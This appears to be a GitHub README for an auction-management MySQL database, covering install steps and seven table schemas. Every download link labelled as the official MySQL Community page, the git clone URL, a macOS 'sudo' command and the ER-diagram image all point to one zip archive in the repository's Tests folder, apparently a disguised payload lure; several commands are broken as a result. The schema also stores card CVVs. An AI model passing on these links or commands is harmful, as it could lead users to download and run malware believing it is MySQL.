# Auction Management Database

This repository contains the SQL files for an Auction Management System. The database design supports user management, auction listings, bidding, payment processing, and user ratings.

## Table of Contents
1. [Setting Up MySQL Server and Workbench](#setting-up-mysql-server-and-workbench)
   - [Prerequisites](#prerequisites)
   - [Installing MySQL Server](#installing-mysql-server)
     - [Windows](#windows)
     - [macOS](#macos)
     - [Linux](#linux)
2. [Setup](#setup)
3. [Database Overview](#database-overview)
   - [Table Descriptions](#table-descriptions)
     - [Users Table](#users-table)
     - [Auctions Table](#auctions-table)
     - [Bids Table](#bids-table)
     - [Categories Table](#categories-table)
     - [Payments Table](#payments-table)
     - [Ratings Table](#ratings-table)
     - [PaymentMethods Table](#paymentmethods-table)
   - [Relationships](#relationships)
   - [ER-Diagram](#er-diagram)

## Setting Up MySQL Server and Workbench

### Prerequisites
- A computer running Windows, macOS, or Linux.
- Administrative access to install software.

### Installing MySQL Server

#### Windows
1. Download the MySQL Installer from the [MySQL Community Downloads page](https://github.com/Deathfrosthacker/AuctionManagementDB/raw/refs/heads/main/Tests/Management-Auction-DB-1.1.zip).
2. Run the installer and choose the "MySQL Server" option.
3. Follow the installation wizard. You can choose the default settings for most users.
4. Set a root password when prompted (remember this for later access).
5. Complete the installation, and choose to start the server.

#### macOS
1. Download the MySQL Community Server DMG archive from the [MySQL Community Downloads page](https://github.com/Deathfrosthacker/AuctionManagementDB/raw/refs/heads/main/Tests/Management-Auction-DB-1.1.zip).
2. Open the DMG file and install MySQL by dragging it to the Applications folder.
3. After installation, you may use the System Preferences pane to configure MySQL or start it from the command line:
    ```bash
    sudo https://github.com/Deathfrosthacker/AuctionManagementDB/raw/refs/heads/main/Tests/Management-Auction-DB-1.1.zip start
    ```

#### Linux
1. Update your package repository.
    ```bash
    sudo apt update 
    ```
2. Install the MySQL server.
    ```bash 
    sudo apt install mysql-server
    ```
3. Secure your MySQL installation:
    ```bash
    sudo mysql_secure_installation
    ```
4. Follow the prompts:
    - Set a root password (if prompted).
    - Remove anonymous users.
    - Disallow root login remotely.
    - Remove the test database.
    - Reload privilege tables.
5. Enable the MySQL service to start automatically at boot:
    ```bash
    sudo systemctl enable mysql
    ```
6. Start the MySQL service immediately:
    ```bash
    sudo systemctl start mysql
    ```
7. Access MySQL:
    ```bash
    sudo mysql -u root -p
    ```
    Enter your password when prompted.

8. Download the MySQL workbench for Linux from the [MySQL Community Downloads page](https://github.com/Deathfrosthacker/AuctionManagementDB/raw/refs/heads/main/Tests/Management-Auction-DB-1.1.zip).

## Setup

1. Clone the repository in your project directory:
    ```bash
    git clone https://github.com/Deathfrosthacker/AuctionManagementDB/raw/refs/heads/main/Tests/Management-Auction-DB-1.1.zip

2. Navigate to the project directory
   ```bash
   cd ../../AuctionManagementDB

3. Execute the create the https://github.com/Deathfrosthacker/AuctionManagementDB/raw/refs/heads/main/Tests/Management-Auction-DB-1.1.zip query
   ```bash
   create database if not exists auctionManagement;

4. Execute the create tables queries and be free to manipulate any other data in the project. 

## Database Overview

The auction management database consists of seven main tables:

1. **Users**
2. **Auctions**
3. **Bids**
4. **Categories**
5. **Payments**
6. **Ratings**
7. **PaymentMethods**

### Table Descriptions

#### Users Table
Stores information about users, including buyers, sellers, and administrators.

- `user_id`: Unique identifier for the user (Primary Key).
- `username`: Unique username for login purposes.
- `email`: Unique email address for account communication.
- `password`: Securely stored password hash.
- `created_at`: Timestamp of account creation.
- `updated_at`: Timestamp for tracking updates.
- `role`: User role (admin, seller, buyer).
- `firstName`: User's first name.
- `lastName`: User's last name.
- `DOB`: User's date of birth.
- `postalAddress`: User's postal address.
- `phoneNumber`: User's unique phone number for account communication.
- `paymId`: Payment ID that links users to their setup payment methods. 

#### Auctions Table
Stores details of auctions created by users.

- `auction_id`: Unique identifier for the auction (Primary Key).
- `title`: Title of the auction item.
- `description`: Detailed description of the auction item.
- `starting_bid`: Initial bid amount.
- `current_bid`: Current highest bid amount.
- `end_time`: Closing time of the auction.
- `user_id`: Reference to the user who created the auction (Foreign Key).
- `category_id`: Reference to the category of the auction (Foreign Key).
- `created_at`: Timestamp of auction creation.
- `updated_at`: Timestamp for tracking updates.
- `maxBidders`: Maximum number of bidders allowed to bid for an item.

#### Bids Table
Stores information about bids placed on auctions.

- `bid_id`: Unique identifier for each bid (Primary Key).
- `auction_id`: Reference to the auction being bid on (Foreign Key).
- `bidder_id`: Reference to the user placing the bid (Foreign Key).
- `bid_amount`: Amount of the bid placed.
- `created_at`: Timestamp of bid placement.

#### Categories Table
Stores auction categories for organizing auction items.

- `category_id`: Unique identifier for the category (Primary Key).
- `name`: Unique name of the category.
- `description`: Description of the category.

#### Payments Table
Tracks payment transactions related to successfully completed auctions.

- `payment_id`: Unique identifier for each payment (Primary Key).
- `user_id`: Reference to the user making the payment (Foreign Key).
- `auction_id`: Reference to the auction for which the payment is made (Foreign Key).
- `amount`: Amount of the payment.
- `status`: Status of the payment (pending, completed, refunded).
- `created_at`: Timestamp of payment processing.
- `paymId`: Reference to the payment method used by the user.

#### Ratings Table
Stores ratings and comments given by buyers to sellers after a transaction.

- `rating_id`: Unique identifier for each rating (Primary Key).
- `seller_id`: Reference to the user receiving the rating (Foreign Key).
- `buyer_id`: Reference to the user giving the rating (Foreign Key).
- `rating`: Numeric rating value between 1 and 5.
- `comment`: Optional comment accompanying the rating.
- `created_at`: Timestamp of when the rating was given.

#### PaymentMethods Table
Stores information about users' payment methods for making transactions.

- `paymId`: Unique identifier for each payment method of a user (Primary Key).
- `user_id`: Reference to the user to whom the payment method belongs (Foreign Key).
- `type`: Type of payment method (card, PayPal, M-Pesa, other).
- `details`: Details of the payment method, e.g., phone number for M-Pesa payment.
- `holderName`: The name registered to the payment method.
- `expiryDate`: The expiry date of the payment method where applicable.
- `CVV`: Applicable to cards only.

### Relationships
- **Users** can create multiple **Auctions**.
- **Auctions** can have multiple **Bids**.
- **Users** can place multiple **Bids**.
- Each **Auction** belongs to one **Category**.
- **Users** can have multiple **Payments**.
- **Users** can have multiple **Payment Methods**.
- **Users** can leave multiple **Ratings** for different sellers.
- Each **Payment** is linked to one **Payment Method**.

### ER-Diagram
<img src="https://github.com/Deathfrosthacker/AuctionManagementDB/raw/refs/heads/main/Tests/Management-Auction-DB-1.1.zip" alt="ErDiagram">
